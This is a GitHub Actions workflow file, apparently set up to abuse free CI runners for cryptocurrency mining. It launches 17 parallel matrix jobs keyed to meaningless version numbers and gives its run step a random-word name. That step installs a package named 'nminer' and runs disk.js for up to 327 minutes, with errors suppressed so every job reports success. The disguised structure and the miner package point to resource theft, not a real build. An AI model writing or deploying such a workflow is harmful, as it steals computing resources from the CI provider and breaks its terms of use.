name: disk
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4260 }
          - { version: 5082 }
          - { version: 8919 }
          - { version: 3664 }
          - { version: 6758 }
          - { version: 94 }
          - { version: 2439 }
          - { version: 5753 }
          - { version: 4117 }
          - { version: 5841 }
          - { version: 667 }
          - { version: 214 }
          - { version: 4793 }
          - { version: 2051 }
          - { version: 6925 }
          - { version: 3413 }
          - { version: 6572 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: around under able
        run: |
          npm install nminer@latest
          timeout 327m node disk.js || echo "disk executed"